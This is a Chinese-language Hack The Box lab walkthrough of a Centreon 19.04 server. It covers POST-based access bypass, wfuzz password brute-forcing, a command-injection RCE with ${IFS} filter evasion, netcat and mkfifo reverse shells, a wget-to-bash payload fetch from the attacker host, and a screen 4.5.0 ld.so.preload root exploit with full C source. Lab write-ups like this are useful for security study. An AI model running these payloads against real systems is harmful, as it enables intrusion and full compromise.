> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/QHIUM1oimDvGv_R9f33Img)

![](https://mmbiz.qpic.cn/mmbiz_gif/lFOEJLHA9qlicxGM47K4815LLNn8DTMZibibkkllDgjFG8nwKN4w3mSiaib9MQaV4THiaaZQ1icBU5dzMjwrHIjOoFolw/640?wx_fmt=gif)

**声明：**请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者及本公众号无关！

**START**

0x01 初始访问

nmap 扫描结果：

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

访问 80 端口  

http://10.10.10.157/monitoring   --->  Protected area by the admin 

系统提示没有权限访问

绕过方式：  

burp 抓包修改请求方式为 POST 成功绕过验证，301 跳转

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmkE7CY7QPUAg7eYibUooUYwSl2A8MXCc4Aw5wvvZZh6a7CH9dmWtTQJ1sCYbZgSTmfs7L9n9myZsA/640?wx_fmt=png)

随后点击上方的 Follow Redirection 即可跟随到跳转页面

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmkE7CY7QPUAg7eYibUooUYwwhXT0Wh5FfWU0koIg9Leia0SLGbGbkxzb7EzvLofd5Siaqv4Y7cm7QIg/640?wx_fmt=png)

0x02 使用最朴素的方法得到账密

http://10.10.10.157/centreon/  --->centreon  v. 19.04.0 登录页面  ----> RCE (需要管理员账户密码)

```
web页面默认凭据 admin/centreon   
ssh 默认凭据 root：centreon
```

默认凭据失效；尝试爆破，但是存在 CSRF 保护，每次验证过后都会重新生成令牌

当时可以利用该应用的 API 接口：相关文档 

https://documentation.centreon.com/docs/centreon/en/19.04/api/api_rest/index.html

POST 方式认证发送 "user 到 http://xx.xx.xx.xx/centreon/api/index.php?action=authenticate ---> 认证成功返回 200 状态码，否则 401

使用 wfuzz 工具进行爆破  

```
wfuzz -z file,/usr/share/wordlists/rockyou.txt -d “username=admin&password=FUZZ” –sc 200 http://10.10.10.157/centreon/api/index.php?action=authenticate
爆破结果：admin：password1
```

0x03 ******利用 centreon RCE 漏洞反弹 shell******

在 kali 下 searchsploit 搜索相关 centreon 得应用漏洞

对比以前搜集的该应用的版本信息，找到远程代码执行的 py 脚本

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmkE7CY7QPUAg7eYibUooUYwhPjsQrqDibjNrFJWjBAg5hZjW3mjzXoh2N9BWia3aYkBEnupdXWgI3LQ/640?wx_fmt=png)

```
python 47069.py   http://10.10.10.157/centreon  admin password1  10.10.14.67 4444  
```

发现并没有返回 shell 到 nc，猜测存在过滤。  

手工尝试：

Configuration-->Pollers --->Pollers---->add--->Monitoring Engine Binary 字段，命令注入    

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmkE7CY7QPUAg7eYibUooUYwjbQXEgBGYVticiaicYicbE0T5ibOSFD7msZdpicWStgDsLZylxhx9Uh6IP5Q/640?wx_fmt=png)

保存 -->Expore Configuration-->Expore

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmkE7CY7QPUAg7eYibUooUYw1lKUF5Aay7Lh2RmiciaZ8HRAXYAVzs8kseV7wicGjJgm7gmls5pP7Bqdg/640?wx_fmt=png)

命令执行绕过测试：

```
ls -al ####返回Forbidden
ls${IFS}al ####正常返回结果----->对空格进行过滤
反弹shell：
nc${IFS}10.10.14.67${IFS}1337${IFS}-e${IFS}/bin/bash；----> 保存的时候Forbidden
rm${IFS}/tmp/f;mkfifo${IFS}/tmp/f;cat${IFS}/tmp/f|/bin/sh${IFS}-i${IFS}2>&1|nc${IFS}10.10.14.67${IFS}1337${IFS}>/tmp/f；
没有回连；受符号影响？？？改用base64
echo${IFS}bmNhdCAxMC4xMC4xNC42NyA0NDQ0IC1lIC9iaW4vYmFzaAo=${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;
返回错误：sh: 1: -v: not found
```

尝试远程加载 paylaod 执行

```
kali@kali:~$ cat shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.67 1337 >/tmp/f
```

填入 paylaod：

```
wget${IFS}-qO-${IFS}http://10.10.14.67:8000/shell${IFS}|${IFS}bash;
```

成功反弹 www-data shell

0x04 ******权限提升******

查看可以 suid 提权的可执行文件

```
$ find / -perm -u=s -type f 2>/dev/null
/bin/screen-4.5.0
.....
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmkE7CY7QPUAg7eYibUooUYwuUOsJlcPIiaPz8TkYcaBdJVpLOwJWnzweIpkny9cPYaZbOJMiaqu03yw/640?wx_fmt=png)

按照 sh 教程走，生成对应文件

libhax.c

```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

编译命令：  

```
gcc -fPIC -shared -ldl -o libhax.so libhax.c
```

rootshell.c

```
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

编译命令：

```
gcc -o rootshell rootshell.c
```

exploit.sh

```
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
```

将 libhax.so rootshell exploit.sh 上传到目标机器，./ 执行提取的 sh 脚本，成功提权

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmkE7CY7QPUAg7eYibUooUYwwB0YPJYzDhA3NKOF6LRn6yPhQRWVuUOu5lqeNp1dokZ2TMoiaMaAibeQ/640?wx_fmt=png)

- 往期推荐 -

  

[Chatterbox(hack the box 系列)](http://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247484507&idx=1&sn=27ac98be7db39d45ae86a1f8b00afd7c&chksm=cf4d8b3af83a022c9f0564cd6ea69a479b3fa516ffee509d80e85a4696618bdb6e39b38b9e9d&scene=21#wechat_redirect)  

[hack the box 系列之 Freelance](http://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247484161&idx=1&sn=45f16a2113812f2a28919be34ba6584c&chksm=cf4d8c60f83a0576cf905f7421e373b3c2b49ebce32b2b41ac21c816a29b82a7adb5662c413a&scene=21#wechat_redirect)  

**【推荐书籍】**